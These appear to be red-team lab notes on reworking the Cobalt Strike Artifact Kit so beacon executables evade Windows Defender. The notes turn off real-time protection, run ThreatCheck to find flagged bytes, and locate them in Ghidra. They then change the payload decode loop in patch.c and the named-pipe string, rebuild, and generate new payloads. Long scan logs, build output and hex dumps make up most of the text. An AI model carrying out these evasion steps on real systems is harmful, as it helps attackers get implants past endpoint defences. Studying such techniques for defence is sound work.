open `WSL` on `Attacker Desktop` and cd to artifact kit location
```powershell
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact/
```
build the artifact kit with
```powershell
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
```
![[Pasted image 20240217181350.png]]
in a `powershell` session on `Attacker Desktop` utilize the command below to run `ThreatCheck` against the beacon executables.
turn off `real time threat protection` 1st!
![[Pasted image 20240217181547.png]]
```powershell
PS C:\Users\Attacker> C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64big.exe
[*] C:\Temp doesn't exist. Creating it...
[+] Target file size: 350720 bytes
[+] Analyzing...
[*] Testing 175360 bytes
[*] Threat found, splitting
[*] Testing 87680 bytes
[*] Threat found, splitting
[*] Testing 43840 bytes
[*] Threat found, splitting
[*] Testing 21920 bytes
[*] Threat found, splitting
[*] Testing 10960 bytes
[*] Threat found, splitting
[*] Testing 5480 bytes
[*] Threat found, splitting
[*] Testing 2740 bytes
[*] Threat found, splitting
[*] Testing 1370 bytes
[*] No threat found, increasing size
[*] Testing 176045 bytes
[*] Threat found, splitting
[*] Testing 88707 bytes
[*] Threat found, splitting
[*] Testing 45038 bytes
[*] Threat found, splitting
[*] Testing 23204 bytes
[*] Threat found, splitting
[*] Testing 12287 bytes
[*] Threat found, splitting
[*] Testing 6828 bytes
[*] Threat found, splitting
[*] Testing 4099 bytes
[*] Threat found, splitting
[*] Testing 2734 bytes
[*] Threat found, splitting
[*] Testing 2052 bytes
[*] No threat found, increasing size
[*] Testing 176386 bytes
[*] Threat found, splitting
[*] Testing 89219 bytes
[*] Threat found, splitting
[*] Testing 45635 bytes
[*] Threat found, splitting
[*] Testing 23843 bytes
[*] Threat found, splitting
[*] Testing 12947 bytes
[*] Threat found, splitting
[*] Testing 7499 bytes
[*] Threat found, splitting
[*] Testing 4775 bytes
[*] Threat found, splitting
[*] Testing 3413 bytes
[*] Threat found, splitting
[*] Testing 2732 bytes
[*] Threat found, splitting
[*] Testing 2392 bytes
[*] No threat found, increasing size
[*] Testing 176556 bytes
[*] Threat found, splitting
[*] Testing 89474 bytes
[*] Threat found, splitting
[*] Testing 45933 bytes
[*] Threat found, splitting
[*] Testing 24162 bytes
[*] Threat found, splitting
[*] Testing 13277 bytes
[*] Threat found, splitting
[*] Testing 7834 bytes
[*] Threat found, splitting
[*] Testing 5113 bytes
[*] Threat found, splitting
[*] Testing 3752 bytes
[*] Threat found, splitting
[*] Testing 3072 bytes
[*] Threat found, splitting
[*] Testing 2732 bytes
[*] Threat found, splitting
[*] Testing 2562 bytes
[*] Threat found, splitting
[*] Testing 2477 bytes
[*] No threat found, increasing size
[*] Testing 176598 bytes
[*] Threat found, splitting
[*] Testing 89537 bytes
[*] Threat found, splitting
[*] Testing 46007 bytes
[*] Threat found, splitting
[*] Testing 24242 bytes
[*] Threat found, splitting
[*] Testing 13359 bytes
[*] Threat found, splitting
[*] Testing 7918 bytes
[*] Threat found, splitting
[*] Testing 5197 bytes
[*] Threat found, splitting
[*] Testing 3837 bytes
[*] Threat found, splitting
[*] Testing 3157 bytes
[*] Threat found, splitting
[*] Testing 2817 bytes
[*] Threat found, splitting
[*] Testing 2647 bytes
[*] Threat found, splitting
[*] Testing 2562 bytes
[*] Threat found, splitting
[*] Testing 2519 bytes
[*] Threat found, splitting
[*] Testing 2498 bytes
[*] No threat found, increasing size
[*] Testing 176609 bytes
[*] Threat found, splitting
[*] Testing 89553 bytes
[*] Threat found, splitting
[*] Testing 46025 bytes
[*] Threat found, splitting
[*] Testing 24261 bytes
[*] Threat found, splitting
[*] Testing 13379 bytes
[*] Threat found, splitting
[*] Testing 7938 bytes
[*] Threat found, splitting
[*] Testing 5218 bytes
[*] Threat found, splitting
[*] Testing 3858 bytes
[*] Threat found, splitting
[*] Testing 3178 bytes
[*] Threat found, splitting
[*] Testing 2838 bytes
[*] Threat found, splitting
[*] Testing 2668 bytes
[*] Threat found, splitting
[*] Testing 2583 bytes
[*] Threat found, splitting
[*] Testing 2540 bytes
[*] Threat found, splitting
[*] Testing 2519 bytes
[*] Threat found, splitting
[*] Testing 2508 bytes
[*] No threat found, increasing size
[*] Testing 176614 bytes
[*] Threat found, splitting
[*] Testing 89561 bytes
[*] Threat found, splitting
[*] Testing 46034 bytes
[*] Threat found, splitting
[*] Testing 24271 bytes
[*] Threat found, splitting
[*] Testing 13389 bytes
[*] Threat found, splitting
[*] Testing 7948 bytes
[*] Threat found, splitting
[*] Testing 5228 bytes
[*] Threat found, splitting
[*] Testing 3868 bytes
[*] Threat found, splitting
[*] Testing 3188 bytes
[*] Threat found, splitting
[*] Testing 2848 bytes
[*] Threat found, splitting
[*] Testing 2678 bytes
[*] Threat found, splitting
[*] Testing 2593 bytes
[*] Threat found, splitting
[*] Testing 2550 bytes
[*] Threat found, splitting
[*] Testing 2529 bytes
[*] Threat found, splitting
[*] Testing 2518 bytes
[*] Threat found, splitting
[*] Testing 2513 bytes
[*] Threat found, splitting
[*] Testing 2510 bytes
[*] No threat found, increasing size
[*] Testing 176615 bytes
[*] Threat found, splitting
[*] Testing 89562 bytes
[*] Threat found, splitting
[*] Testing 46036 bytes
[*] Threat found, splitting
[*] Testing 24273 bytes
[*] Threat found, splitting
[*] Testing 13391 bytes
[*] Threat found, splitting
[*] Testing 7950 bytes
[*] Threat found, splitting
[*] Testing 5230 bytes
[*] Threat found, splitting
[*] Testing 3870 bytes
[*] Threat found, splitting
[*] Testing 3190 bytes
[*] Threat found, splitting
[*] Testing 2850 bytes
[*] Threat found, splitting
[*] Testing 2680 bytes
[*] Threat found, splitting
[*] Testing 2595 bytes
[*] Threat found, splitting
[*] Testing 2552 bytes
[*] Testing 2531 bytes
[*] Threat found, splitting
[*] Testing 2520 bytes
[*] Threat found, splitting
[*] Testing 2515 bytes
[*] Threat found, splitting
[*] Testing 2512 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0x9D0
00000000   48 83 EC 28 48 8B 05 45  33 05 00 C7 00 01 00 00   H?ì(H?·E3··Ç····
00000010   00 E8 AA FC FF FF 90 90  48 83 C4 28 C3 0F 1F 00   ·èªüÿÿ??H?Ä(A···
00000020   48 83 EC 28 48 8B 05 25  33 05 00 C7 00 00 00 00   H?ì(H?·%3··Ç····
00000030   00 E8 8A FC FF FF 90 90  48 83 C4 28 C3 0F 1F 00   ·è?üÿÿ??H?Ä(A···
00000040   48 83 EC 28 E8 47 60 00  00 48 85 C0 0F 94 C0 0F   H?ì(èG`··H?A·?A·
00000050   B6 C0 F7 D8 48 83 C4 28  C3 90 90 90 90 90 90 90   A÷OH?Ä(A???????
00000060   48 8D 0D 09 00 00 00 E9  D4 FF FF FF 0F 1F 40 00   H?·····éOÿÿÿ··@·
00000070   C3 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90   A???????????????
00000080   48 FF E1 48 63 05 D6 6A  00 00 85 C0 7E 26 83 3D   HÿáHc·Öj··?A~&?=
00000090   CF 6A 00 00 00 7E 1D 48  8B 15 06 6D 05 00 48 89   Ij···~·H?··m··H?
000000A0   14 01 48 8B 15 03 6D 05  00 48 63 05 B4 6A 00 00   ··H?··m··Hc·'j··
000000B0   48 89 14 01 C3 41 54 55  57 56 53 48 83 EC 40 41   H?··AATUWVSH?ì@A
000000C0   B9 04 00 00 00 4C 63 E2  48 89 CF 4C 89 C5 31 C9   1····LcâH?IL?Å1É
000000D0   41 B8 00 30 00 00 4C 89  E2 4C 89 E6 FF 15 22 6D   A,·0··L?âL?æÿ·"m
000000E0   05 00 48 89 C3 31 C0 39  C6 7E 15 48 89 C2 83 E2   ··H?A1A9Æ~·H?A?â
000000F0   07 8A 54 15 00 32 14 07  88 14 03 48 FF C0 EB E7   ·?T··2··?··HÿAëç

[*] Run time: 24.4s
PS C:\Users\Attacker> C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64big.exe
[+] Target file size: 350720 bytes
[+] Analyzing...
[*] Testing 175360 bytes
[!] Identified end of bad bytes at offset 0x9D0
00000000   48 83 EC 28 48 8B 05 45  33 05 00 C7 00 01 00 00   H?ì(H?·E3··Ç····
00000010   00 E8 AA FC FF FF 90 90  48 83 C4 28 C3 0F 1F 00   ·èªüÿÿ??H?Ä(A···
00000020   48 83 EC 28 48 8B 05 25  33 05 00 C7 00 00 00 00   H?ì(H?·%3··Ç····
00000030   00 E8 8A FC FF FF 90 90  48 83 C4 28 C3 0F 1F 00   ·è?üÿÿ??H?Ä(A···
00000040   48 83 EC 28 E8 47 60 00  00 48 85 C0 0F 94 C0 0F   H?ì(èG`··H?A·?A·
00000050   B6 C0 F7 D8 48 83 C4 28  C3 90 90 90 90 90 90 90   A÷OH?Ä(A???????
00000060   48 8D 0D 09 00 00 00 E9  D4 FF FF FF 0F 1F 40 00   H?·····éOÿÿÿ··@·
00000070   C3 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90   A???????????????
00000080   48 FF E1 48 63 05 D6 6A  00 00 85 C0 7E 26 83 3D   HÿáHc·Öj··?A~&?=
00000090   CF 6A 00 00 00 7E 1D 48  8B 15 06 6D 05 00 48 89   Ij···~·H?··m··H?
000000A0   14 01 48 8B 15 03 6D 05  00 48 63 05 B4 6A 00 00   ··H?··m··Hc·'j··
000000B0   48 89 14 01 C3 41 54 55  57 56 53 48 83 EC 40 41   H?··AATUWVSH?ì@A
000000C0   B9 04 00 00 00 4C 63 E2  48 89 CF 4C 89 C5 31 C9   1····LcâH?IL?Å1É
000000D0   41 B8 00 30 00 00 4C 89  E2 4C 89 E6 FF 15 22 6D   A,·0··L?âL?æÿ·"m
000000E0   05 00 48 89 C3 31 C0 39  C6 7E 15 48 89 C2 83 E2   ··H?A1A9Æ~·H?A?â
000000F0   07 8A 54 15 00 32 14 07  88 14 03 48 FF C0 EB E7   ·?T··2··?··HÿAëç
```
![[Pasted image 20240217181710.png]]
open up ghidra to chase the bad bytes. `C:\Tools\ghidra-10.3.1\ghidraRun.bat`
open new project and import `artifact64big.exe` and go `search -> memory` with the last string of bytes to identify the location `07 8A 54 15 00 32 14 07  88 14 03 48 FF C0 EB E7`
![[Pasted image 20240217182258.png]]
that points to the functions `CreateThread` `VirtualProtect` & `VirtualAlloc` so open the *FOLDER* of `src-common` in `VSCode` to fix the code
open up this path in `vscode` `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common`
![[Pasted image 20240217182624.png]]
`CTRL-F` to find the `VirtualProtect` function which leads to code in `patch.c` 
add this code into the `decode the payload with the key` portion
original
![[Pasted image 20240217182830.png]]
```powershell
modified
```powershell
   /* decode the payload with the key */
   for (int x = 0; x < length; x++) {

      char* a = (char *)ptr + x;
      char* b = (char *)buffer + x;

      // random
      GetTickCount();

      *a = *b ^ key[x % 8];
   }
```
![[Pasted image 20240217182957.png]]
save the file -> rebuild the kit in `wsl`
```powershell
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobalt
strike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
```
 -> run `threatcheck again` in powershell
 ```powershell
 PS C:\Users\Attacker> C:\Tools\ThreatCheck\Threatcheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64big.exe
[+] Target file size: 350720 bytes
[+] Analyzing...
[*] Testing 175360 bytes
[*] Threat found, splitting
[*] Testing 87680 bytes
[*] Threat found, splitting
[*] Testing 43840 bytes
[*] Threat found, splitting
[*] Testing 21920 bytes
[*] Threat found, splitting
[*] Testing 10960 bytes
[*] Threat found, splitting
[*] Testing 5480 bytes
[*] Threat found, splitting
[*] Testing 2740 bytes
[*] No threat found, increasing size
[*] Testing 176730 bytes
[*] Threat found, splitting
[*] Testing 89735 bytes
[*] Threat found, splitting
[*] Testing 46237 bytes
[*] Threat found, splitting
[*] Testing 24488 bytes
[*] Threat found, splitting
[*] Testing 13614 bytes
[*] Threat found, splitting
[*] Testing 8177 bytes
[*] Threat found, splitting
[*] Testing 5458 bytes
[*] Threat found, splitting
[*] Testing 4099 bytes
[*] Threat found, splitting
[*] Testing 3419 bytes
[*] Threat found, splitting
[*] Testing 3079 bytes
[*] No threat found, increasing size
[*] Testing 176899 bytes
[*] Threat found, splitting
[*] Testing 89989 bytes
[*] Threat found, splitting
[*] Testing 46534 bytes
[*] Threat found, splitting
[*] Testing 24806 bytes
[*] Threat found, splitting
[*] Testing 13942 bytes
[*] Threat found, splitting
[*] Testing 8510 bytes
[*] Threat found, splitting
[*] Testing 5794 bytes
[*] Threat found, splitting
[*] Testing 4436 bytes
[*] Threat found, splitting
[*] Testing 3757 bytes
[*] Threat found, splitting
[*] Testing 3418 bytes
[*] Threat found, splitting
[*] Testing 3248 bytes
[*] Threat found, splitting
[*] Testing 3163 bytes
[*] No threat found, increasing size
[*] Testing 176941 bytes
[*] Threat found, splitting
[*] Testing 90052 bytes
[*] Threat found, splitting
[*] Testing 46607 bytes
[*] Threat found, splitting
[*] Testing 24885 bytes
[*] Threat found, splitting
[*] Testing 14024 bytes
[*] Threat found, splitting
[*] Testing 8593 bytes
[*] Threat found, splitting
[*] Testing 5878 bytes
[*] Threat found, splitting
[*] Testing 4520 bytes
[*] Threat found, splitting
[*] Testing 3841 bytes
[*] Threat found, splitting
[*] Testing 3502 bytes
[*] Threat found, splitting
[*] Testing 3332 bytes
[*] Threat found, splitting
[*] Testing 3247 bytes
[*] Threat found, splitting
[*] Testing 3205 bytes
[*] Threat found, splitting
[*] Testing 3184 bytes
[*] No threat found, increasing size
[*] Testing 176952 bytes
[*] Threat found, splitting
[*] Testing 90068 bytes
[*] Threat found, splitting
[*] Testing 46626 bytes
[*] Threat found, splitting
[*] Testing 24905 bytes
[*] Threat found, splitting
[*] Testing 14044 bytes
[*] Threat found, splitting
[*] Testing 8614 bytes
[*] Threat found, splitting
[*] Testing 5899 bytes
[*] Threat found, splitting
[*] Testing 4541 bytes
[*] Threat found, splitting
[*] Testing 3862 bytes
[*] Threat found, splitting
[*] Testing 3523 bytes
[*] Threat found, splitting
[*] Testing 3353 bytes
[*] Threat found, splitting
[*] Testing 3268 bytes
[*] Threat found, splitting
[*] Testing 3226 bytes
[*] Threat found, splitting
[*] Testing 3205 bytes
[*] Threat found, splitting
[*] Testing 3194 bytes
[*] No threat found, increasing size
[*] Testing 176957 bytes
[*] Threat found, splitting
[*] Testing 90075 bytes
[*] Threat found, splitting
[*] Testing 46634 bytes
[*] Threat found, splitting
[*] Testing 24914 bytes
[*] Threat found, splitting
[*] Testing 14054 bytes
[*] Threat found, splitting
[*] Testing 8624 bytes
[*] Threat found, splitting
[*] Testing 5909 bytes
[*] Threat found, splitting
[*] Testing 4551 bytes
[*] Threat found, splitting
[*] Testing 3872 bytes
[*] Threat found, splitting
[*] Testing 3533 bytes
[*] Threat found, splitting
[*] Testing 3363 bytes
[*] Threat found, splitting
[*] Testing 3278 bytes
[*] Threat found, splitting
[*] Testing 3236 bytes
[*] Threat found, splitting
[*] Testing 3215 bytes
[*] Threat found, splitting
[*] Testing 3204 bytes
[*] Threat found, splitting
[*] Testing 3199 bytes
[*] No threat found, increasing size
[*] Testing 176959 bytes
[*] Threat found, splitting
[*] Testing 90079 bytes
[*] Threat found, splitting
[*] Testing 46639 bytes
[*] Threat found, splitting
[*] Testing 24919 bytes
[*] Threat found, splitting
[*] Testing 14059 bytes
[*] Threat found, splitting
[*] Testing 8629 bytes
[*] Threat found, splitting
[*] Testing 5914 bytes
[*] Threat found, splitting
[*] Testing 4556 bytes
[*] Threat found, splitting
[*] Testing 3877 bytes
[*] Threat found, splitting
[*] Testing 3538 bytes
[*] Threat found, splitting
[*] Testing 3368 bytes
[*] Threat found, splitting
[*] Testing 3283 bytes
[*] Threat found, splitting
[*] Testing 3241 bytes
[*] Threat found, splitting
[*] Testing 3220 bytes
[*] Threat found, splitting
[*] Testing 3209 bytes
[*] Threat found, splitting
[*] Testing 3204 bytes
[*] Threat found, splitting
[*] Testing 3201 bytes
[*] No threat found, increasing size
[*] Testing 176960 bytes
[*] Threat found, splitting
[*] Testing 90080 bytes
[*] Threat found, splitting
[*] Testing 46640 bytes
[*] Threat found, splitting
[*] Testing 24920 bytes
[*] Threat found, splitting
[*] Testing 14060 bytes
[*] Threat found, splitting
[*] Testing 8630 bytes
[*] Threat found, splitting
[*] Testing 5915 bytes
[*] Threat found, splitting
[*] Testing 4558 bytes
[*] Threat found, splitting
[*] Testing 3879 bytes
[*] Threat found, splitting
[*] Testing 3540 bytes
[*] Threat found, splitting
[*] Testing 3370 bytes
[*] Threat found, splitting
[*] Testing 3285 bytes
[*] Threat found, splitting
[*] Testing 3243 bytes
[*] Threat found, splitting
[*] Testing 3222 bytes
[*] Threat found, splitting
[*] Testing 3211 bytes
[*] Threat found, splitting
[*] Testing 3206 bytes
[*] Threat found, splitting
[*] Testing 3203 bytes
[*] No threat found, increasing size
[*] Testing 176961 bytes
[*] Threat found, splitting
[*] Testing 90082 bytes
[*] Threat found, splitting
[*] Testing 46642 bytes
[*] Threat found, splitting
[*] Testing 24922 bytes
[*] Threat found, splitting
[*] Testing 14062 bytes
[*] Threat found, splitting
[*] Testing 8632 bytes
[*] Threat found, splitting
[*] Testing 5917 bytes
[*] Threat found, splitting
[*] Testing 4560 bytes
[*] Threat found, splitting
[*] Testing 3881 bytes
[*] Threat found, splitting
[*] Testing 3542 bytes
[*] Threat found, splitting
[*] Testing 3372 bytes
[*] Threat found, splitting
[*] Testing 3287 bytes
[*] Threat found, splitting
[*] Testing 3245 bytes
[*] Threat found, splitting
[*] Testing 3224 bytes
[*] Threat found, splitting
[*] Testing 3213 bytes
[*] Threat found, splitting
[*] Testing 3208 bytes
[*] Threat found, splitting
[*] Testing 3205 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0xC85
00000000   C4 31 C0 49 83 FC FF 74  3E 85 DB 7E 1F 49 89 F9   Ä1AI?üÿt>?U~·I?ù
00000010   41 89 D8 48 89 F2 4C 89  E1 48 C7 44 24 20 00 00   A?OH?òL?áHÇD$ ··
00000020   00 00 FF 15 07 6B 05 00  85 C0 75 10 4C 89 E1 FF   ··ÿ··k··?Au·L?áÿ
00000030   15 72 6A 05 00 B8 01 00  00 00 EB 0B 8B 54 24 4C   ·rj··,····ë·?T$L
00000040   48 01 D6 29 D3 EB C2 48  83 C4 58 5B 5E 5F 41 5C   H·Ö)OëAH?ÄX[^_A\
00000050   C3 41 54 56 53 48 83 EC  20 48 8B 1D 2B 30 05 00   AATVSH?ì H?·+0··
00000060   48 63 4B 04 E8 3A 5D 00  00 48 8B 35 CF 6A 05 00   HcK·è:]··H?5Ij··
00000070   49 89 C4 B9 00 04 00 00  FF D6 8B 53 04 4C 89 E1   I?Ä1····ÿÖ?S·L?á
00000080   E8 2A FF FF FF 85 C0 74  EA 8B 53 04 4C 8D 43 08   è*ÿÿÿ?Atê?S·L?C·
00000090   4C 89 E1 E8 68 FD FF FF  4C 89 E1 E8 1B 5D 00 00   L?áèhyÿÿL?áè·]··
000000A0   31 C0 48 83 C4 20 5B 5E  41 5C C3 48 83 EC 68 FF   1AH?Ä [^A\AH?ìhÿ
000000B0   15 52 6A 05 00 B9 AA 26  00 00 31 D2 41 B9 5C 00   ·Rj··1ª&··1OA1\·
000000C0   00 00 F7 F1 C7 44 24 50  5C 00 00 00 C7 44 24 48   ··÷ñÇD$P\···ÇD$H
000000D0   65 00 00 00 C7 44 24 40  70 00 00 00 C7 44 24 38   e···ÇD$@p···ÇD$8
000000E0   69 00 00 00 C7 44 24 30  70 00 00 00 C7 44 24 28   i···ÇD$0p···ÇD$(
000000F0   5C 00 00 00 C7 44 24 20  2E 00 00 00 41 B8 5C 00   \···ÇD$ .···A,\·
```
close out the file in ghidra and reopen it.
once reopened use `5C 00 00 00 C7 44 24 20  2E 00 00 00 41 B8 5C 00` in `search -> memory`
![[Pasted image 20240217184251.png]]
search the `cnetsvc` in `vscode`,
original
![[Pasted image 20240217184336.png]]
change the `pipename` to `sprintf(pipename, "%c%c%c%c%c%c%c%c%cMicrosoft-bugsinthere1337\\m", 92, 92, 46, 92, 112, 105, 112, 101, 92);`
![[Pasted image 20240217184501.png]]
save the file
rebuild the `artifact kit` in `WSL`
```powershell
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobalt
strike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
```
run `threatcheck`
![[Pasted image 20240217185526.png]]
load new aggressor script into `cobaltstrike`
![[Pasted image 20240217185712.png]]
generate the new payloads